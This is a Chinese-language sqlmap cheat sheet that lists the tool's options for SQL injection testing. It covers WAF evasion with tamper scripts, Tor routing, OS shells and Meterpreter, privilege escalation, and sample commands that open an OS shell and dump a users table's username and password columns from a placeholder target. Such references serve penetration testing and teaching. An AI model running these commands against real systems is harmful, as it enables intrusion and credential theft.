# sqlmap 速查表

> 来源: sqlmap-Cheat-Sheet.pdf
> 更新日期: 2026-05-21 (从PDF提取整理)

---

## 基本选项（必须至少指定一个）

| 选项 | 说明 |
|------|------|
| `-u URL` | 目标URL，格式: `-u "http://www.target.com/path/file.htm?variable=1"` |
| `-d DIRECT` | 数据库直连，格式: `-d DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME` |
| `-l LOGFILE` | 从Burp/WebScarab代理日志解析目标 |
| `-m BULKFILE` | 从文本文件批量扫描（每行一个URL） |
| `-r REQUESTFILE` | 从文件加载HTTP请求 |
| `-g GOOGLEDORK` | 处理Google dork结果作为目标URL |
| `-c CONFIGFILE` | 从INI配置文件加载选项 |
| `--wizard` | 引导式执行 |
| `--update` | 更新sqlmap到最新版本 |
| `--purge` | 清除sqlmap数据文件夹 |
| `--dependencies` | 检查缺失的sqlmap依赖 |
| `-h` | 基本帮助 |
| `-hh` | 高级帮助 |
| `--version` | 显示版本号 |
| `-v VERBOSE` | 详细程度级别 (0-6) |

---

## 注入选项

| 选项 | 说明 |
|------|------|
| `-p TESTPARAMETER` | 指定可测试参数 |
| `--skip=SKIP` | 跳过指定参数测试 |
| `--skip-static` | 跳过看似非动态参数 |
| `--param-exclude=` | 正则排除参数 (如 `"ses"`) |
| `--param-filter=` | 按位置选择参数 (如 `"POST"`) |
| `--dbms=DBMS` | 强制指定后端数据库类型 |
| `--dbms-cred=` | 数据库认证凭据 (user:password) |
| `--os=OS` | 强制指定操作系统 |
| `--invalid-bignum` | 使用大数值使参数无效化 |
| `--invalid-logical` | 使用逻辑操作使参数无效化 |
| `--invalid-string` | 使用随机字符串使参数无效化 |
| `--no-cast` | 关闭payload铸造机制 |
| `--no-escape` | 关闭字符串转义机制 |
| `--prefix=PREFIX` | 注入payload前缀 |
| `--suffix=SUFFIX` | 注入payload后缀 |
| `--tamper=TAMPER` | 使用tamper脚本修改注入数据 |

---

## 检测选项

| 选项 | 说明 |
|------|------|
| `--level=LEVEL` | 测试级别 (1-5, 默认1) |
| `--risk=RISK` | 风险级别 (1-3, 默认1) |
| `--string=STRING` | 查询为True时匹配的字符串 |
| `--not-string=` | 查询为False时匹配的字符串 |
| `--regexp=REGEXP` | 查询为True时匹配的正则 |
| `--code=CODE` | 查询为True时匹配的HTTP状态码 |
| `--smart` | 仅在正向启发式检测后执行深入测试 |

### Level级别说明

| Level | 范围 |
|-------|------|
| 1 | 有限测试，测试GET和POST参数 (默认) |
| 2 | 测试Cookie |
| 3 | 测试Cookie + User-Agent/Referer |
| 4 | 以上 + 参数空值和其他bug |
| 5 | 广泛测试，包含payload和边界输入文件 |

### Risk级别说明

| Risk | 说明 |
|------|------|
| 1 | 快速、不易察觉的测试 (默认) |
| 2 | 耗时、大数据量处理，如时间盲注 |
| 3 | 添加OR-based SQLI和可能的数据篡改 |

---

## 攻击技术

| 选项 | 说明 |
|------|------|
| `--technique=TECHNIQUE` | SQL注入技术选择 (默认 "BEUSTQ") |
| `--time-sec=TIMESEC` | 延迟DBMS响应秒数 (默认5) |
| `--union-cols=UCOLS` | UNION查询列数范围 |
| `--union-char=UCHAR` | 暴力破解列数的字符 |
| `--union-from=UFROM` | UNION查询FROM部分的表 |
| `--dns-domain=` | DNS外带攻击域名 |
| `--second-url=` | 二阶响应页面URL |
| `--second-req=` | 从文件加载二阶HTTP请求 |
| `-f` | 执行广泛的DBMS版本指纹识别 |
| `--fingerprint` | 同上 |

### 技术字母含义

| 字母 | 技术 |
|------|------|
| B | Boolean-based blind (布尔盲注) |
| E | Error-based (报错注入) |
| U | UNION query (联合查询) |
| S | Stacked queries (堆叠注入) |
| T | Time-based blind (时间盲注) |
| Q | Inline queries (内联查询) |

---

## 请求选项

| 选项 | 说明 |
|------|------|
| `-A AGENT` / `--user-agent=` | HTTP User-Agent头 |
| `-H HEADER` / `--headers=` | 额外Header (如 `"X-Forwarded-For: 127.0.0.1"`) |
| `--method=METHOD` | HTTP方法 (GET/POST/PUT) |
| `--data=DATA` | POST数据 (如 `"id=1"`) |
| `--param-del=` | 参数分隔符 (如 `&`) |
| `--cookie=COOKIE` | HTTP Cookie值 |
| `--cookie-del=` | Cookie分隔符 (如 `;`) |
| `--live-cookies=` | 从文件加载实时cookie |
| `--load-cookies=` | 加载Netscape/wget格式cookie |
| `--drop-set-cookie` | 忽略响应中的Set-Cookie |
| `--mobile` | 模拟智能手机User-Agent |
| `--random-agent` | 随机选择User-Agent |
| `--host=HOST` | HTTP Host头 |
| `--referer=REFERER` | HTTP Referer头 |
| `--auth-type=` | 认证类型 (Basic, Digest, NTLM, PKI) |
| `--auth-cred=` | 认证凭据 (name:password) |
| `--auth-file=` | PEM证书/私钥文件 |
| `--ignore-code=` | 忽略HTTP错误码 (如401) |
| `--ignore-proxy` | 忽略系统默认代理 |
| `--ignore-redirects` | 忽略重定向 |
| `--ignore-timeouts` | 忽略连接超时 |
| `--proxy=PROXY` | 使用代理连接 |
| `--proxy-cred=` | 代理认证凭据 |
| `--proxy-file=` | 从文件加载代理列表 |
| `--proxy-freq=` | 代理切换间隔请求数 |
| `--tor` | 使用Tor匿名网络 |
| `--tor-port=` | Tor代理端口 |
| `--tor-type=` | Tor代理类型 (HTTP/SOCKS4/SOCKS5) |
| `--check-tor` | 检查Tor是否正常 |
| `--delay=DELAY` | 请求间隔秒数 |
| `--timeout=TIMEOUT` | 超时秒数 (默认30) |
| `--retries=RETRIES` | 超时重试次数 (默认3) |
| `--randomize=RPARAM` | 随机变更指定参数值 |
| `--safe-url=SAFEURL` | 测试期间频繁访问的安全URL |
| `--safe-post=` | 安全URL的POST数据 |
| `--safe-req=` | 从文件加载安全HTTP请求 |
| `--safe-freq=` | 访问安全URL的请求间隔 |
| `--skip-urlencode` | 跳过payload URL编码 |
| `--csrf-token=` | 反CSRF token参数 |
| `--csrf-url=` | 提取反CSRF token的URL |
| `--csrf-method=` | 反CSRF token页面HTTP方法 |
| `--csrf-retries=` | 获取反CSRF token的重试次数 |
| `--force-ssl` | 强制使用SSL/HTTPS |
| `--chunked` | 使用HTTP分块传输编码 |
| `--hpp` | 使用HTTP参数污染 |
| `--eval=EVALCODE` | 请求前执行Python代码 |

---

## 优化选项

| 选项 | 说明 |
|------|------|
| `-o` | 开启所有优化开关 |
| `--predict-output` | 预测常见查询输出 |
| `--keep-alive` | 使用持久HTTP连接 |
| `--null-connection` | 获取页面长度而不获取响应体 |
| `--threads=THREADS` | 并发HTTP请求数 (默认1) |

---

## 操作系统访问

| 选项 | 说明 |
|------|------|
| `--os-cmd=OSCMD` | 执行操作系统命令 |
| `--os-shell` | 交互式操作系统shell |
| `--os-pwn` | OOB shell/Meterpreter/VNC |
| `--os-smbrelay` | 一键OOB shell/Meterpreter/VNC |
| `--os-bof` | 存储过程缓冲区溢出利用 |
| `--priv-esc` | 数据库进程用户提权 |
| `--msf-path=MSFPATH` | Metasploit Framework本地路径 |
| `--tmp-path=TMPPATH` | 远程临时文件目录 |

---

## 通用选项

| 选项 | 说明 |
|------|------|
| `-s SESSIONFILE` | 从存储的.sqlite文件加载会话 |
| `-t TRAFFICFILE` | 记录所有HTTP流量到文本文件 |
| `--answers=ANSWERS` | 预设答案 (如 `"quit=N,follow=N"`) |
| `--base64=BASE64PARAMS` | 包含Base64编码数据的参数 |
| `--base64-safe` | 使用URL和文件名安全的Base64 (RFC 4648) |
| `--batch` | 永不询问，使用默认行为 |
| `--binary-fields=` | 二进制格式的结果字段 (如 `"digest"`) |
| `--check-internet` | 评估目标前检查网络连接 |
| `--cleanup` | 从数据库清除sqlmap特定UDF和表 |
| `--crawl=CRAWLDEPTH` | 从目标URL开始爬取 |
| `--crawl-exclude=` | 正则排除爬取页面 (如 `"logout"`) |
| `--csv-del=CSVDEL` | CSV输出分隔符 (默认 `","`) |
| `--charset=CHARSET` | 盲注字符集 (如 `"0123456789abcdef"`) |
| `--dump-format=` | 数据dump格式 (CSV/HTML/SQLITE) |
| `--encoding=ENCODING` | 数据检索的字符编码 (如 GBK) |
| `--eta` | 显示每个输出的预计到达时间 |
| `--flush-session` | 刷新当前目标会话文件 |
| `--forms` | 解析并测试目标URL的表单 |
| `--fresh-queries` | 忽略会话文件中存储的查询结果 |
| `--gpage=GOOGLEPAGE` | 从指定页码开始使用Google dork |
| `--har=HARFILE` | 记录所有HTTP流量到HAR文件 |
| `--hex` | 数据检索时使用hex转换 |
| `--output-dir=` | 自定义输出目录 |
| `--parse-errors` | 从响应中解析并显示DBMS错误 |
| `--preprocess=PREPROCESS` | 使用命名脚本预处理请求 |
| `--postprocess=POSTPROCESS` | 使用命名脚本后处理响应 |
| `--repair` | 重新dump有未知字符标记(?)的条目 |
| `--save=SAVECONFIG` | 保存选项到INI配置文件 |
| `--scope=SCOPE` | 正则筛选目标 |
| `--skip-heuristics` | 跳过SQLi/XSS启发式检测 |
| `--skip-waf` | 跳过WAF/IPS启发式检测 |
| `--table-prefix=` | 临时表前缀 (默认: `"sqlmap"`) |
| `--test-filter=` | 按payload和标题选择测试 (如 ROW) |
| `--test-skip=` | 按payload和标题跳过测试 (如 BENCHMARK) |
| `--web-root=WEBROOT` | Web服务器文档根目录 (如 `"/var/www"`) |

---

## 爆破选项

| 选项 | 说明 |
|------|------|
| `--common-tables` | 检查常见表 |
| `--common-columns` | 检查常见列 |
| `--common-files` | 检查常见文件 |

---

## 杂项

| 选项 | 说明 |
|------|------|
| `-z MNEMONICS` | 简短助记符 (如 `"flu,bat,ban,tec=EU"`) |
| `--alert=ALERT` | SQL注入发现时运行OS命令 |
| `--beep` | 提问和/或发现SQLi/XSS/FI时蜂鸣 |
| `--disable-coloring` | 禁用控制台输出着色 |
| `--list-tampers` | 显示可用tamper脚本列表 |
| `--offline` | 离线模式（仅使用会话数据） |
| `--results-file=` | 多目标模式下CSV结果文件位置 |
| `--shell` | 交互式sqlmap shell |
| `--tmp-dir=TMPDIR` | 临时文件本地目录 |
| `--unstable` | 针对不稳定连接调整选项 |

---

## Verbose级别

| Level | 内容 |
|-------|------|
| 0 | 仅Python traceback、错误和严重消息 |
| 1 | 0 + 信息和警告消息 |
| 2 | 1 + 调试消息 |
| 3 | 2 + 注入的payload |
| 4 | 3 + HTTP请求 |
| 5 | 4 + HTTP响应头 |
| 6 | 5 + HTTP响应内容 |

---

## 常用组合示例

```bash
# 基础扫描
sqlmap -u "http://target.com/page.php?id=1"

# 指定数据库+技术+批量
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql --technique=BEU --batch

# 高等级全面测试
sqlmap -u "http://target.com/page.php?id=1" --level=3 --risk=2

# 使用tamper脚本绕过WAF
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase --random-agent

# 从Burp请求文件加载
sqlmap -r request.txt -p id --dbs

# OS shell（需dba权限）
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# 数据dump
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users -C username,password --dump
```
